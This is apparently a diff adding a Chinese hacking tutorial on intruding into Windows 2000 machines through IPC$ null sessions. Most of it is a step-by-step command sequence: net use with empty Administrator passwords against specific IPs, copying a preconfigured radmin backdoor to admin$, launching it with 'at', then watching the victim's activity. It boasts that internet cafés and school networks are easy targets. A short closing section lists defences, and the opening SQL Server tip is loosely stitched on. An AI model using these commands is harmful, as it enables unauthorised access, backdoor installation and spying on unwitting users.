@@ -1,0 +1,99 @@
+　　而且在一般情况下，一些功能对管理员来说也是没有必要的。如果你不需要MS SQL Server 的xp_cmdshell(use sp_dropextendedproc "xp_cmdshell"这项功能就不要把xp_cmdshell extended stored proc(扩展存储过程)命令功能留着。
+
+　　我们只需要在isql窗口中输入：
+
+use master
+sp_dropextendedproc 'xp_cmdshell'
+
+
+net use 映射盘符: \\肉鸡IP\肉鸡盘符
+
+譬如：
+
+net use z: \\1.1.1.1\c    (把对方的c盘映射成你的z盘)，
+
+察看一下开了哪些端口,有445哦,
+
+(主要是针对2000系统的)
+netstat -an
+
+命令:net view
+
+(有的机器用的是win98的系统查不出的)
+
+看一下自己的IP
+
+再看看用户:
+
+于是可以进行IPC$连接了(关于IPC$空连接的资料你可以上网搜索一下)
+
+命令:net use \\220.160.199.38\ipc$ "" /user:Administrator
+命令:net use \\ip\ipc$ 密码 /user:用户
+net use \\220.160.199.38\ipc$ "" /user:"zyz"
+
+显示命令成功
+
+可以用这个命令看下是否成功:net use
+
+好了,现在我们给他传个咚咚--我配置好的radmin
+
+命令:copy 本地文件 远程目录
+如:copy c:\4899.exe \\192.168.0.200\admin$
+(这里的$是指admin用户的c:\winnt\system32\)
+
+传过去了,我们当然要运行它啊,怎么运行呢?接着看
+
+现在我们来看看他机器的时间
+
+命令:net time \\192.168.0.200
+
+然后用这个命令启动
+
+at \\192.168.0.200 时间 要运行的文件
+at \\IP 时间 要运行的文件
+(这个是计划任务里边的一个命令)
+
+好了,然后呢,嘿嘿----等!
+
+看下我们的后门运行了没有?
+呵呵,上线了
+
+我回头看看是哪个MM or GG?
+我们看看她在干什么?
+
+嘿嘿~OK了吧!至于以后你要做什么,就看你了
+
+这个方法还可以入侵网吧的主机,其实内网一般都有这个漏洞
+特别象学校或网吧等地方
+
+我试过了,不过,现在偶不搞他
+
+好了,到这里了,防范方法在下边,88!
+
+
+防范ipc$入侵:
+1.禁止空连接进行枚举(此操作并不能阻止空连接的建立,引自《解剖win2000下的空会话》)
+首先运行regedit，找到如下组建[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA]把RestrictAnonymous = DWORD的键值改为：00000001(如果设置为2的话,有一些问题会发生,比如一些WIN的服务出现问题等等)
+
+2.禁止默认共享
+1）察看本地共享资源
+运行-cmd-输入net share
+2）删除共享(每次输入一个）
+net share ipc$ /delete
+net share admin$ /delete
+net share c$ /delete
+net share d$ /delete（如果有e,f,……可以继续删除）
+3）停止server服务
+net stop server /y （重新启动后server服务会重新开启）
+4）修改注册表
+运行-regedit
+server版:找到如下主键[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters]把AutoShareServer（DWORD）的键值改为:00000000。 
+pro版:找到如下主键[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters]把AutoShareWks（DWORD）的键值改为:00000000。 
+如果上面所说的主键不存在，就新建(右击-新建-双字节值）一个主健再改键值。 
+
+3.永久关闭ipc$和默认共享依赖的服务:lanmanserver即server服务
+控制面板-管理工具-服务-找到server服务（右击）-属性-常规-启动类型-已禁用
+
+4.安装防火墙(选中相关设置)，或者端口过滤(滤掉139,445等),或者用新版本的优化大师
+
+5.设置复杂管理员密码，防止通过ipc$穷举密码
